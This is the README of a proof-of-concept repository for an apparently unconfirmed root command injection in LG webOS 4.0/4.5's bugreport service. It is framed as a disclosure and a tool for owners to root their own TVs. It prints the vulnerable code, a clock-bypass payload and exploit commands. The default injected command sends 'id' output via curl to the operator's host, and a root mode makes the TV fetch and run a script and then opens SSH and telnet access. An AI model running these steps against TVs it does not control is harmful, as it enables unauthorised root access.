# webos-4x-bugreport-rce

Command injection in `com.palm.service.bugreport/fileCrashReport` on LG webOS **4.0 and 4.5**
(2018–2019 TVs), reachable from a web app through the SSAP `launchWebApp` bridge.

**Status: static finding. Not confirmed at runtime.** No TV was exploited while writing this.
The purpose of this repository is to let someone with the affected hardware test it safely.

## ELI18: what this is

LG TVs run webOS. A background service called `com.palm.service.bugreport` is supposed to collect
crash logs. It accepts a file path from any app that can talk to it, glues that path into a shell
command, and runs the command as **root**. A web page running on the TV can reach that service.
If the chain works on a real TV, a web page could run one command as root — and from there install
Homebrew Channel and SSH.

This repository is the static proof and a test harness. It is **not yet confirmed on hardware**.

## Which TVs?

Only webOS **4.0 and 4.5**:

- 2018 models: **B8, C8, E8, W8, G8** — firmware `05.50.x` (tested `05.50.70`), OTA `W18x`
- 2019 models: **B9, C9, E9, W9** — firmware `05.50.x` (tested `05.50.00`), OTA `W19x`

Verified by extracting the firmware: B8 and C8 share the same vulnerable files; B9 and C9 too.
The service is absent in webOS 3.5 (2017) and in webOS 5.0/6.0 (2020/2021). 2016 models use the
older MVPD method instead.

## Why it matters if you updated

Many root methods stop working after a firmware update: MVPD was removed in webOS 3.5, DejaVuln
was patched on many 5+ TVs, and faultmanager is patched on recent firmware. If you updated a
2018/2019 TV and lost root, this bug is still present in the **latest 4.0/4.5 builds** (2025
EPKs). If the PoC is confirmed, it could give those TVs a new root path without Developer Mode,
then Homebrew Channel and SSH via `docs/ROOTING.md`.

It does **not** help TVs already updated to webOS 5.0 or newer: the service is gone there. Do not
update a 4.0/4.5 TV if you want to keep this option.

## Affected versions (verified on extracted firmware)

| Firmware | webOS | Model | OTA | Service | Vulnerable code |
| :--- | :--- | :--- | :--- | :--- | :--- |
| 06.10.65 | 3.5 | B7 | W17H | absent | — |
| **05.50.70** | **4.0** | **C8** | **W18O** | **present** | **yes** |
| **05.50.70** | **4.0** | **B8** | **W18H** | **present** | **yes** |
| **05.50.00** | **4.5** | **C9** | **W19O** | **present** | **yes** |
| **05.50.00** | **4.5** | **B9** | **W19H** | **present** | **yes** |
| 04.64.00 | 5.0 | CX | W20O | absent | — |
| 03.53.45 | 6.0 | C1 | W21O | absent | — |

Both vulnerable builds are **2025** releases (EPK dated 2025-04-29 and 2025-09-18), so LG still
ships the vulnerable code in the latest 4.0/4.5 firmware. The service disappears with webOS 5.0.
2016/2017 models (webOS 3.x) are not affected.

Known file hashes and how to check a new build: `docs/FINGERPRINTS.md`.

The check can be reproduced on any extracted rootfs:

```sh
python3 tools/check_bugreport.py /path/to/rootfs
```

## The bug

`bugreport-service.js` passes client-controlled `filepath` and `filename` to
`rdx-manager.js`, which builds a shell command and runs it with `exec`:

```js
// rdx-manager.js:56-73
cmd = "rm -rf " + dest + "; mkdir -p " + dest + "; tar zxf " + file + " -C " + dest;
exec(cmd, ...);                       // /bin/sh -c
```

`filepath` is never validated; the `filename` blacklist does not block spaces, `/` or backticks.
The service is started by `ls-hubd` as root (no `User=` field, no setuid).

## Gates

1. `isCrashReportingEnabled()` — default **true**.
2. Official image — true on a stock TV.
3. Build age: `isOlderThan(buildMaxAge)`, default **5 days**, compared to `/etc/version`.
   For a TV updated more than 5 days ago, this blocks the path.
4. Bypass: `setSystemTime` (`com.webos.service.systemservice/time/setSystemTime`,
   payload `{"utc": <epoch seconds>}`) is in the `private` permission group and its handler
   has no caller check. Setting the clock to build date + a few days passes the age check.
5. Permissions: `fileCrashReport` is provided as `public`/`private` (compat) and `system.debug`
   (service). LS2 unions provided groups; the `webapphost` client has `private`+`public`, so the
   intersection allows the call.

## Testing on a TV (non-destructive)

Requirements: a 2018/2019 LG TV on webOS 4.0/4.5, same LAN, Python 3, and permission to pair.

1. Find the build date of the TV:
   - from the LG support page of the exact firmware, or
   - `/etc/version` if you already have a root shell (first 8 digits, `YYYYMMDD`).
2. Compute an epoch timestamp a few days after that date, for example on macOS:
   ```sh
   date -j -f "%Y%m%d" 20250429 +%s   # then add 86400
   ```
3. Run the harness:
   ```sh
   python3 poc/poc.py --tv 192.0.2.10 --local-ip 192.0.2.20 --utc <epoch>
   ```
4. Accept the pairing prompt on the TV.
5. Expected result: the harness receives a POST on `/result` containing
   `uid=0(root) gid=0(root) ...`.
6. If it fails, the harness prints the service replies. Typical outcomes:
   - `Permission denied` → the client context differs on this firmware;
   - `build too old` → the clock bypass did not apply (check `autoClock` / the timestamp);
   - service absent → the TV is not 4.0/4.5.

By default the injected command is `id | curl -s -d@- http://<local>:<port>/result`. It writes
nothing on the TV. To write a marker instead:

```sh
python3 poc/poc.py ... --cmd 'touch /tmp/bugreport_poc'
```

The clock change is the only side effect. Restore it by rebooting (NTP) or by calling
`setSystemTime` with the correct time / `autoClock:on`.

## If the PoC works: root the TV

The same harness has a post-exploitation mode. It serves `poc/root.sh`, makes the TV fetch and
run it as root, installs Homebrew Channel, elevates its service, optionally installs SSH keys and
starts a root telnet:

```sh
python3 poc/poc.py --tv 192.0.2.10 --local-ip 192.0.2.20 --utc <build_epoch> --root \
  --hb-ipk ~/Downloads/org.webosbrew.hbchannel_0.7.3_all.ipk \
  --ssh-pubkey ~/.ssh/id_ed25519.pub --telnet
```

Full procedure, verification and rollback: `docs/ROOTING.md`.

## Repository layout

```
poc/poc.py            SSAP pairing, page server, app launch, proof and --root modes
poc/root.sh           post-exploitation script (Homebrew Channel, SSH, telnet)
poc/webos_ssap.py     minimal SSAP client (TLS WebSocket)
docs/WRITEUP.md       full static analysis, code paths, gates, evidence
docs/ROOTING.md       one-shot -> shell -> persistent root -> rollback
docs/FINGERPRINTS.md  known hashes and how to detect a patched build
tools/check_bugreport.py  offline check of an extracted rootfs
```

## What is not proven

- No runtime execution on any TV.
- The actual `buildMaxAge` value in the TV configuration database (default is 5 days).
- Whether `setSystemTime` changes the clock while network time is active
  (`ClockHandler::manualOverride`).
- The real uid of the bugreport service (root is inferred from the launch model).
- Whether later 4.0/4.5 builds patch the JavaScript (the latest 2025 builds do not).

## Safety

This is command execution as root on the TV. Use it only on hardware you own. The default PoC is
read-only (`id` sent back to your machine). Do not run it on a TV you do not control.

## License

AGPL-3.0-or-later. See `LICENSE`.
